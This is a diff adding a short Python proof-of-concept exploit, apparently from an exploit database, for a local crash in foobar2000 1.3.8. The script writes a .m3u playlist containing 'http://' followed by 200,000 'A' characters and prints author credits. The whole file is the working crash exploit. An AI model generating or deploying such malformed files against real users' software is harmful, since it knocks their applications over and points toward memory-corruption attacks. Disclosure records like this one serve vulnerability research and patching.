@@ -1,0 +1,19 @@
+# Exploit Title: foobar2000 1.3.8 (.m3u) Local Crash PoC
+# Date: 12-06-2015
+# Exploit Author: 0neb1n
+# Vendor Homepage: http://www.foobar2000.org/
+# Software Link: http://www.foobar2000.org/getfile/e246984718ab7ab58fa1e0b072ff05a4/foobar2000_v1.3.8.exe
+# Version: 1.3.8
+# Tested on: Windows XP SP3 KOR
+
+file = "poc.m3u"
+
+data = 'http://' + '\x41' * 200000
+
+fd = open(file, 'w')
+fd.write(data)
+fd.close()
+print ""
+print "[*] File successfully created !!"
+print "[*] Author : 0neb1n"
+print "[*] Mail : barcodecrow(at)gmail(dot)com"
